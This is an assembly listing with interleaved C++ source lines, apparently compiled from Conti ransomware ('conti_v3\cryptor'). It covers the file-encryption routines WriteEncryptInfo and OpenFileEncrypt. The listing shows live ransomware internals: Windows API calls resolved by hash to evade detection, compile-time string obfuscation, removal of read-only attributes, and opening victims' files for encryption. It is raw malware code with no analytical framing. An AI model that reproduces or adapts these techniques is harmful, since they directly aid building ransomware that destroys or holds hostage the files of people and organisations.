	00 55		 mov	 BYTE PTR $T8[rbp-233], 85 ; 00000055H
  00833	c6 85 88 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-232], 46 ; 0000002eH
  0083a	c6 85 89 00 00
	00 65		 mov	 BYTE PTR $T8[rbp-231], 101 ; 00000065H
  00841	c6 85 8a 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-230], 46 ; 0000002eH
  00848	c6 85 8b 00 00
	00 36		 mov	 BYTE PTR $T8[rbp-229], 54 ; 00000036H
  0084f	c6 85 8c 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-228], 46 ; 0000002eH
  00856	c6 85 8d 00 00
	00 7e		 mov	 BYTE PTR $T8[rbp-227], 126 ; 0000007eH
  0085d	c6 85 8e 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-226], 46 ; 0000002eH
  00864	c6 85 8f 00 00
	00 55		 mov	 BYTE PTR $T8[rbp-225], 85 ; 00000055H
  0086b	c6 85 90 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-224], 46 ; 0000002eH
  00872	c6 85 91 00 00
	00 53		 mov	 BYTE PTR $T8[rbp-223], 83 ; 00000053H
  00879	c6 85 92 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-222], 46 ; 0000002eH
  00880	c6 85 93 00 00
	00 5a		 mov	 BYTE PTR $T8[rbp-221], 90 ; 0000005aH
  00887	c6 85 94 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-220], 46 ; 0000002eH
  0088e	c6 85 95 00 00
	00 32		 mov	 BYTE PTR $T8[rbp-219], 50 ; 00000032H
  00895	c6 85 96 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-218], 46 ; 0000002eH
  0089c	c6 85 97 00 00
	00 55		 mov	 BYTE PTR $T8[rbp-217], 85 ; 00000055H
  008a3	c6 85 98 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-216], 46 ; 0000002eH
  008aa	c6 85 99 00 00
	00 53		 mov	 BYTE PTR $T8[rbp-215], 83 ; 00000053H
  008b1	c6 85 9a 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-214], 46 ; 0000002eH
  008b8	c6 85 9b 00 00
	00 2b		 mov	 BYTE PTR $T8[rbp-213], 43 ; 0000002bH
  008bf	c6 85 9c 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-212], 46 ; 0000002eH
  008c6	c6 85 9d 00 00
	00 03		 mov	 BYTE PTR $T8[rbp-211], 3
  008cd	c6 85 9e 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-210], 46 ; 0000002eH
  008d4	c6 85 9f 00 00
	00 36		 mov	 BYTE PTR $T8[rbp-209], 54 ; 00000036H
  008db	c6 85 a0 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-208], 46 ; 0000002eH
  008e2	c6 85 a1 00 00
	00 55		 mov	 BYTE PTR $T8[rbp-207], 85 ; 00000055H
  008e9	c6 85 a2 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-206], 46 ; 0000002eH
  008f0	c6 85 a3 00 00
	00 67		 mov	 BYTE PTR $T8[rbp-205], 103 ; 00000067H
  008f7	c6 85 a4 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-204], 46 ; 0000002eH
  008fe	c6 85 a5 00 00
	00 4f		 mov	 BYTE PTR $T8[rbp-203], 79 ; 0000004fH
  00905	c6 85 a6 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-202], 46 ; 0000002eH
  0090c	c6 85 a7 00 00
	00 6e		 mov	 BYTE PTR $T8[rbp-201], 110 ; 0000006eH
  00913	c6 85 a8 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-200], 46 ; 0000002eH
  0091a	c6 85 a9 00 00
	00 55		 mov	 BYTE PTR $T8[rbp-199], 85 ; 00000055H
  00921	c6 85 aa 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-198], 46 ; 0000002eH
  00928	c6 85 ab 00 00
	00 49		 mov	 BYTE PTR $T8[rbp-197], 73 ; 00000049H
  0092f	c6 85 ac 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-196], 46 ; 0000002eH
  00936	c6 85 ad 00 00
	00 36		 mov	 BYTE PTR $T8[rbp-195], 54 ; 00000036H
  0093d	c6 85 ae 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-194], 46 ; 0000002eH
  00944	c6 85 af 00 00
	00 6c		 mov	 BYTE PTR $T8[rbp-193], 108 ; 0000006cH
  0094b	c6 85 b0 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-192], 46 ; 0000002eH
  00952	c6 85 b1 00 00
	00 5b		 mov	 BYTE PTR $T8[rbp-191], 91 ; 0000005bH
  00959	c6 85 b2 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-190], 46 ; 0000002eH
  00960	c6 85 b3 00 00
	00 41		 mov	 BYTE PTR $T8[rbp-189], 65 ; 00000041H
  00967	c6 85 b4 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-188], 46 ; 0000002eH
  0096e	c6 85 b5 00 00
	00 4f		 mov	 BYTE PTR $T8[rbp-187], 79 ; 0000004fH
  00975	c6 85 b6 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-186], 46 ; 0000002eH
  0097c	c6 85 b7 00 00
	00 6c		 mov	 BYTE PTR $T8[rbp-185], 108 ; 0000006cH
  00983	c6 85 b8 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-184], 46 ; 0000002eH
  0098a	c6 85 b9 00 00
	00 0f		 mov	 BYTE PTR $T8[rbp-183], 15
  00991	c6 85 ba 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-182], 46 ; 0000002eH
  00998	c6 85 bb 00 00
	00 32		 mov	 BYTE PTR $T8[rbp-181], 50 ; 00000032H
  0099f	c6 85 bc 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-180], 46 ; 0000002eH
  009a6	c6 85 bd 00 00
	00 32		 mov	 BYTE PTR $T8[rbp-179], 50 ; 00000032H
  009ad	c6 85 be 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-178], 46 ; 0000002eH
  009b4	c6 85 bf 00 00
	00 5a		 mov	 BYTE PTR $T8[rbp-177], 90 ; 0000005aH
  009bb	c6 85 c0 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-176], 46 ; 0000002eH
  009c2	c6 85 c1 00 00
	00 32		 mov	 BYTE PTR $T8[rbp-175], 50 ; 00000032H
  009c9	c6 85 c2 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-174], 46 ; 0000002eH
  009d0	c6 85 c3 00 00
	00 55		 mov	 BYTE PTR $T8[rbp-173], 85 ; 00000055H
  009d7	c6 85 c4 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-172], 46 ; 0000002eH
  009de	c6 85 c5 00 00
	00 25		 mov	 BYTE PTR $T8[rbp-171], 37 ; 00000025H
  009e5	c6 85 c6 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-170], 46 ; 0000002eH
  009ec	c6 85 c7 00 00
	00 55		 mov	 BYTE PTR $T8[rbp-169], 85 ; 00000055H
  009f3	c6 85 c8 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-168], 46 ; 0000002eH
  009fa	c6 85 c9 00 00
	00 67		 mov	 BYTE PTR $T8[rbp-167], 103 ; 00000067H
  00a01	c6 85 ca 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-166], 46 ; 0000002eH
  00a08	c6 85 cb 00 00
	00 03		 mov	 BYTE PTR $T8[rbp-165], 3
  00a0f	c6 85 cc 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-164], 46 ; 0000002eH
  00a16	c6 85 cd 00 00
	00 0a		 mov	 BYTE PTR $T8[rbp-163], 10
  00a1d	c6 85 ce 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-162], 46 ; 0000002eH
  00a24	c6 85 cf 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-161], 46 ; 0000002eH
  00a2b	c6 85 d0 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-160], 46 ; 0000002eH
  00a32	0f b6 45 71	 movzx	 eax, BYTE PTR $T8[rbp-255]

; 58   :         return m_isDecrypted;

  00a36	0f b6 45 70	 movzx	 eax, BYTE PTR $T8[rbp-256]

; 63   :         if (!isDecrypted())

  00a3a	84 c0		 test	 al, al
  00a3c	75 51		 jne	 SHORT $LN842@WriteEncry
  00a3e	66 90		 npad	 2
$LL843@WriteEncry:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00a40	0f b6 4c 3d 71	 movzx	 ecx, BYTE PTR $T8[rbp+rdi-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00a45	b8 2e 00 00 00	 mov	 eax, 46			; 0000002eH
  00a4a	2b c1		 sub	 eax, ecx
  00a4c	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00a4f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00a54	f7 e9		 imul	 ecx
  00a56	03 d1		 add	 edx, ecx
  00a58	c1 fa 06	 sar	 edx, 6
  00a5b	8b c2		 mov	 eax, edx
  00a5d	c1 e8 1f	 shr	 eax, 31
  00a60	03 d0		 add	 edx, eax
  00a62	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00a65	2b c8		 sub	 ecx, eax
  00a67	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00a6c	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00a6f	f7 e9		 imul	 ecx
  00a71	03 d1		 add	 edx, ecx
  00a73	c1 fa 06	 sar	 edx, 6
  00a76	8b c2		 mov	 eax, edx
  00a78	c1 e8 1f	 shr	 eax, 31
  00a7b	03 d0		 add	 edx, eax
  00a7d	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00a80	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00a82	88 4c 3d 71	 mov	 BYTE PTR $T8[rbp+rdi-255], cl
  00a86	48 ff c7	 inc	 rdi
  00a89	48 83 ff 60	 cmp	 rdi, 96			; 00000060H
  00a8d	72 b1		 jb	 SHORT $LL843@WriteEncry
$LN842@WriteEncry:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 817  : 		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  00a8f	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00a92	48 8d 4d 71	 lea	 rcx, QWORD PTR $T8[rbp-255]
  00a96	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write
$LN5@WriteEncry:

; 818  : 	}
; 819  : 
; 820  : 	return Success;

  00a9b	8b c3		 mov	 eax, ebx
$LN1@WriteEncry:

; 821  : }

  00a9d	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00aa4	48 33 cc	 xor	 rcx, rsp
  00aa7	e8 00 00 00 00	 call	 __security_check_cookie
  00aac	4c 8d 9c 24 00
	02 00 00	 lea	 r11, QWORD PTR [rsp+512]
  00ab4	49 8b 5b 18	 mov	 rbx, QWORD PTR [r11+24]
  00ab8	49 8b 73 20	 mov	 rsi, QWORD PTR [r11+32]
  00abc	49 8b 7b 28	 mov	 rdi, QWORD PTR [r11+40]
  00ac0	49 8b e3	 mov	 rsp, r11
  00ac3	5d		 pop	 rbp
  00ac4	c3		 ret	 0
?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z ENDP	; WriteEncryptInfo
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z
_TEXT	SEGMENT
$T2 = 64
$T8 = 144
$T4 = 224
$T10 = 304
$T1 = 400
$T6 = 496
FileSize$ = 608
__$ArrayPad$ = 616
FileInfo$ = 640
?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z PROC	; OpenFileEncrypt, COMDAT

; 826  : {

$LN1360:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000a	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  0000f	55		 push	 rbp
  00010	48 8d ac 24 90
	fe ff ff	 lea	 rbp, QWORD PTR [rsp-368]
  00018	48 81 ec 70 02
	00 00		 sub	 rsp, 624		; 00000270H
  0001f	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00026	48 33 c4	 xor	 rax, rsp
  00029	48 89 85 68 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 827  : 	DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo->Filename);

  00030	48 8b 19	 mov	 rbx, QWORD PTR [rcx]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 183  : 	pFunction = (DWORD(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x81737792, 96);//GetProcAddress(hKernel32, OBFA("GetFileAttributesW"));

  00033	ba 0f 00 00 00	 mov	 edx, 15
  00038	41 b8 92 77 73
	81		 mov	 r8d, -2123139182	; 81737792H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 826  : {

  0003e	48 8b f1	 mov	 rsi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 183  : 	pFunction = (DWORD(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x81737792, 96);//GetProcAddress(hKernel32, OBFA("GetFileAttributesW"));

  00041	44 8d 4a 51	 lea	 r9d, QWORD PTR [rdx+81]
  00045	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 184  : 	return pFunction(lpFileName);

  0004a	48 8b cb	 mov	 rcx, rbx
  0004d	ff d0		 call	 rax
  0004f	8b f8		 mov	 edi, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 828  : 	if (Attributes != INVALID_FILE_ATTRIBUTES) {

  00051	83 f8 ff	 cmp	 eax, -1			; ffffffffH
  00054	74 27		 je	 SHORT $LN3@OpenFileEn

; 829  : 		if (Attributes & FILE_ATTRIBUTE_READONLY) {

  00056	40 f6 c7 01	 test	 dil, 1
  0005a	74 21		 je	 SHORT $LN3@OpenFileEn

; 830  : 			pSetFileAttributesW(FileInfo->Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);

  0005c	48 8b 1e	 mov	 rbx, QWORD PTR [rsi]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 193  : 	pFunction = (BOOL(WINAPI*)(LPCWSTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x2e6f01df, 95);//GetProcAddress(hKernel32, OBFA("SetFileAttributesW"));

  0005f	ba 0f 00 00 00	 mov	 edx, 15
  00064	41 b8 df 01 6f
	2e		 mov	 r8d, 779026911		; 2e6f01dfH
  0006a	44 8d 4a 50	 lea	 r9d, QWORD PTR [rdx+80]
  0006e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 830  : 			pSetFileAttributesW(FileInfo->Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);

  00073	83 f7 01	 xor	 edi, 1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 194  : 	return pFunction(lpFileName, dwFileAttributes);

  00076	48 8b cb	 mov	 rcx, rbx
  00079	8b d7		 mov	 edx, edi
  0007b	ff d0		 call	 rax
$LN3@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 834  : 	FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,

  0007d	48 8b 1e	 mov	 rbx, QWORD PTR [rsi]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  00080	ba 0f 00 00 00	 mov	 edx, 15
  00085	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  0008b	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  0008f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00094	33 ff		 xor	 edi, edi
  00096	45 33 c9	 xor	 r9d, r9d
  00099	48 89 7c 24 30	 mov	 QWORD PTR [rsp+48], rdi
  0009e	45 33 c0	 xor	 r8d, r8d
  000a1	89 7c 24 28	 mov	 DWORD PTR [rsp+40], edi
  000a5	ba 00 00 00 c0	 mov	 edx, -1073741824	; c0000000H
  000aa	48 8b cb	 mov	 rcx, rbx
  000ad	c7 44 24 20 03
	00 00 00	 mov	 DWORD PTR [rsp+32], 3
  000b5	ff d0		 call	 rax

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  000b7	8d 57 0f	 lea	 edx, QWORD PTR [rdi+15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 834  : 	FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,

  000ba	48 89 46 08	 mov	 QWORD PTR [rsi+8], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  000be	44 8d 4f 5d	 lea	 r9d, QWORD PTR [rdi+93]
  000c2	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  000c8	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  000cd	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 843  : 	if (FileInfo->FileHandle == INVALID_HANDLE_VALUE)

  000cf	48 8b 5e 08	 mov	 rbx, QWORD PTR [rsi+8]
  000d3	48 83 fb ff	 cmp	 rbx, -1
  000d7	0f 85 6c 0c 00
	00		 jne	 $LN6@OpenFileEn

; 844  : 	{
; 845  : 
; 846  : 		if (LastError == ERROR_SHARING_VIOLATION ||

  000dd	83 c0 e0	 add	 eax, -32		; ffffffe0H
  000e0	83 f8 01	 cmp	 eax, 1
  000e3	0f 86 cf 01 00
	00		 jbe	 $LN1334@OpenFileEn
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  000e9	8d 57 0f	 lea	 edx, QWORD PTR [rdi+15]
  000ec	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  000f2	44 8d 4f 5d	 lea	 r9d, QWORD PTR [rdi+93]
  000f6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  000fb	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000fd	40 88 7d 90	 mov	 BYTE PTR $T8[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  00101	44 8b c8	 mov	 r9d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00104	c6 45 91 55	 mov	 BYTE PTR $T8[rbp-255], 85 ; 00000055H
  00108	c6 45 92 15	 mov	 BYTE PTR $T8[rbp-254], 21
  0010c	c6 45 93 35	 mov	 BYTE PTR $T8[rbp-253], 53 ; 00000035H
  00110	c6 45 94 15	 mov	 BYTE PTR $T8[rbp-252], 21
  00114	c6 45 95 49	 mov	 BYTE PTR $T8[rbp-251], 73 ; 00000049H
  00118	c6 45 96 15	 mov	 BYTE PTR $T8[rbp-250], 21
  0011c	c6 45 97 51	 mov	 BYTE PTR $T8[rbp-249], 81 ; 00000051H
  00120	c6 45 98 15	 mov	 BYTE PTR $T8[rbp-248], 21
  00124	c6 45 99 5c	 mov	 BYTE PTR $T8[rbp-247], 92 ; 0000005cH
  00128	c6 45 9a 15	 mov	 BYTE PTR $T8[rbp-246], 21
  0012c	c6 45 9b 50	 mov	 BYTE PTR $T8[rbp-245], 80 ; 00000050H
  00130	c6 45 9c 15	 mov	 BYTE PTR $T8[rbp-244], 21
  00134	c6 45 9d 37	 mov	 BYTE PTR $T8[rbp-243], 55 ; 00000037H
  00138	c6 45 9e 15	 mov	 BYTE PTR $T8[rbp-242], 21
  0013c	c6 45 9f 25	 mov	 BYTE PTR $T8[rbp-241], 37 ; 00000025H
  00140	c6 45 a0 15	 mov	 BYTE PTR $T8[rbp-240], 21
  00144	c6 45 a1 6c	 mov	 BYTE PTR $T8[rbp-239], 108 ; 0000006cH
  00148	c6 45 a2 15	 mov	 BYTE PTR $T8[rbp-238], 21
  0014c	c6 45 a3 49	 mov	 BYTE PTR $T8[rbp-237], 73 ; 00000049H
  00150	c6 45 a4 15	 mov	 BYTE PTR $T8[rbp-236], 21
  00154	c6 45 a5 50	 mov	 BYTE PTR $T8[rbp-235], 80 ; 00000050H
  00158	c6 45 a6 15	 mov	 BYTE PTR $T8[rbp-234], 21
  0015c	c6 45 a7 5a	 mov	 BYTE PTR $T8[rbp-233], 90 ; 0000005aH
  00160	c6 45 a8 15	 mov	 BYTE PTR $T8[rbp-232], 21
  00164	c6 45 a9 24	 mov	 BYTE PTR $T8[rbp-231], 36 ; 00000024H
  00168	c6 45 aa 15	 mov	 BYTE PTR $T8[rbp-230], 21
  0016c	c6 45 ab 6d	 mov	 BYTE PTR $T8[rbp-229], 109 ; 0000006dH
  00170	c6 45 ac 15	 mov	 BYTE PTR $T8[rbp-228], 21
  00174	c6 45 ad 6c	 mov	 BYTE PTR $T8[rbp-227], 108 ; 0000006cH
  00178	c6 45 ae 15	 mov	 BYTE PTR $T8[rbp-226], 21
  0017c	c6 45 af 50	 mov	 BYTE PTR $T8[rbp-225], 80 ; 00000050H
  00180	c6 45 b0 15	 mov	 BYTE PTR $T8[rbp-224], 21
  00184	c6 45 b1 75	 mov	 BYTE PTR $T8[rbp-223], 117 ; 00000075H
  00188	c6 45 b2 15	 mov	 BYTE PTR $T8[rbp-222], 21
  0018c	c6 45 b3 6e	 mov	 BYTE PTR $T8[rbp-221], 110 ; 0000006eH
  00190	c6 45 b4 15	 mov	 BYTE PTR $T8[rbp-220], 21
  00194	c6 45 b5 52	 mov	 BYTE PTR $T8[rbp-219], 82 ; 00000052H
  00198	c6 45 b6 15	 mov	 BYTE PTR $T8[rbp-218], 21
  0019c	c6 45 b7 50	 mov	 BYTE PTR $T8[rbp-217], 80 ; 00000050H
  001a0	c6 45 b8 15	 mov	 BYTE PTR $T8[rbp-216], 21
  001a4	c6 45 b9 0d	 mov	 BYTE PTR $T8[rbp-215], 13
  001a8	c6 45 ba 15	 mov	 BYTE PTR $T8[rbp-214], 21
  001ac	c6 45 bb 6c	 mov	 BYTE PTR $T8[rbp-213], 108 ; 0000006cH
  001b0	c6 45 bc 15	 mov	 BYTE PTR $T8[rbp-212], 21
  001b4	c6 45 bd 5c	 mov	 BYTE PTR $T8[rbp-211], 92 ; 0000005cH
  001b8	c6 45 be 15	 mov	 BYTE PTR $T8[rbp-210], 21
  001bc	c6 45 bf 32	 mov	 BYTE PTR $T8[rbp-209], 50 ; 00000032H
  001c0	c6 45 c0 15	 mov	 BYTE PTR $T8[rbp-208], 21
  001c4	c6 45 c1 35	 mov	 BYTE PTR $T8[rbp-207], 53 ; 00000035H
  001c8	c6 45 c2 15	 mov	 BYTE PTR $T8[rbp-206], 21
  001cc	c6 45 c3 6e	 mov	 BYTE PTR $T8[rbp-205], 110 ; 0000006eH
  001d0	c6 45 c4 15	 mov	 BYTE PTR $T8[rbp-204], 21
  001d4	c6 45 c5 5c	 mov	 BYTE PTR $T8[rbp-203], 92 ; 0000005cH
  001d8	c6 45 c6 15	 mov	 BYTE PTR $T8[rbp-202], 21
  001dc	c6 45 c7 31	 mov	 BYTE PTR $T8[rbp-201], 49 ; 00000031H
  001e0	c6 45 c8 15	 mov	 BYTE PTR $T8[rbp-200], 21
  001e4	c6 45 c9 01	 mov	 BYTE PTR $T8[rbp-199], 1
  001e8	c6 45 ca 15	 mov	 BYTE PTR $T8[rbp-198], 21
  001ec	c6 45 cb 01	 mov	 BYTE PTR $T8[rbp-197], 1
  001f0	c6 45 cc 15	 mov	 BYTE PTR $T8[rbp-196], 21
  001f4	c6 45 cd 37	 mov	 BYTE PTR $T8[rbp-195], 55 ; 00000037H
  001f8	c6 45 ce 15	 mov	 BYTE PTR $T8[rbp-194], 21
  001fc	c6 45 cf 01	 mov	 BYTE PTR $T8[rbp-193], 1
  00200	c6 45 d0 15	 mov	 BYTE PTR $T8[rbp-192], 21
  00204	c6 45 d1 50	 mov	 BYTE PTR $T8[rbp-191], 80 ; 00000050H
  00208	c6 45 d2 15	 mov	 BYTE PTR $T8[rbp-190], 21
